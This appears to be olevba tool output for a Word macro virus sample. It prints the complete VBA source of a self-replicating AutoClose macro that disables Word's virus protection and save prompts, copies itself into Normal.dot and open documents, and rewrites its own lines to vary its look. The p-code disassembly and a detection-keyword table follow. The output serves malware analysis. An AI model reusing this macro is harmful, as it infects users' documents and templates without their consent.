olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.CPCK-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.CPCK-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'14/04/2000 15.01.47
On Error Resume Next
'14/04/2000 15.01.47
Options.VirusProtection = 0
'14/04/2000 15.01.47
CT83 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'14/04/2000 15.01.47
Options.ConfirmConversions = 0
'14/04/2000 15.01.47
Options.SaveNormalPrompt = 0
'14/04/2000 15.01.47
QH45 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'14/04/2000 15.01.47
Application.EnableCancelKey = 0
'14/04/2000 15.01.47
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'14/04/2000 15.01.47
Set KR29 = ActiveDocument.VBProject.VBComponents.Item(1)
'14/04/2000 15.01.47
OT60 = True
'14/04/2000 15.01.47
End If
'14/04/2000 15.01.47
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'14/04/2000 15.01.47
Set KR29 = NormalTemplate.VBProject.VBComponents.Item(1)
'14/04/2000 15.01.47
MQ74 = True
'14/04/2000 15.01.47
End If
'14/04/2000 15.01.47
If MQ74 <> True And OT60 <> True Then GoTo OQ45
'14/04/2000 15.01.47
If MQ74 = True Then KR29.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CT83 - 1))
'14/04/2000 15.01.47
If OT60 = True Then KR29.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, QH45 - 1))
'14/04/2000 15.01.47
With KR29.CodeModule
'14/04/2000 15.01.48
For x = 2 To (KR29.CodeModule.CountOfLines - 1) Step 2
'14/04/2000 15.01.48
.replaceline x, "'" & Now
'14/04/2000 15.01.48
Next x
'14/04/2000 15.01.48
End With
'14/04/2000 15.01.48
OQ45:
'14/04/2000 15.01.48
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.CPCK-based
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7999 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #6:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St CT83 
' Line #7:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St QH45 
' Line #13:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #15:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set KR29 
' Line #19:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #20:
' 	LitVarSpecial (True)
' 	St OT60 
' Line #21:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set KR29 
' Line #27:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #28:
' 	LitVarSpecial (True)
' 	St MQ74 
' Line #29:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #32:
' 	Ld MQ74 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld OT60 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo OQ45 
' 	EndIf 
' Line #33:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #34:
' 	Ld MQ74 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld CT83 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld KR29 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #35:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #36:
' 	Ld OT60 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld QH45 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld KR29 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #37:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.47"
' Line #38:
' 	StartWithExpr 
' 	Ld KR29 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.48"
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld KR29 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #41:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.48"
' Line #42:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Now 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #43:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.48"
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.48"
' Line #46:
' 	EndWith 
' Line #47:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.48"
' Line #48:
' 	Label OQ45 
' Line #49:
' 	QuoteRem 0x0000 0x0013 "14/04/2000 15.01.48"
' Line #50:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

